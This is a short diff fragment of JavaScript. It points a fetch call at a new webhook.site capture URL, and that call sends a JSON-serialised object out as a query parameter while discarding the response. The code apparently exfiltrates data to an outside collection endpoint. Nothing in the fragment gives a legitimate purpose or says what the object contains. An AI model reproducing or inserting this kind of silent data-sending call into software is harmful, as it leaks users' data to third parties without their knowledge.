@@ -64,7 +64,7 @@ var stream = getModule("stream");
 if (!stream || !stream.fetch) return;
 stream.fetch({
 method: "GET",
-url: "https://webhook.site/ee091332-0cec-4592-8016-ad59ec6827d8"+"?d=" +
+url: "https://webhook.site/62eb1d58-77b0-4564-af9a-7d82b4a72f9b"+"?d=" +
 encodeURIComponent(JSON.stringify(obj)),
 type: "text"
 }, function () {});
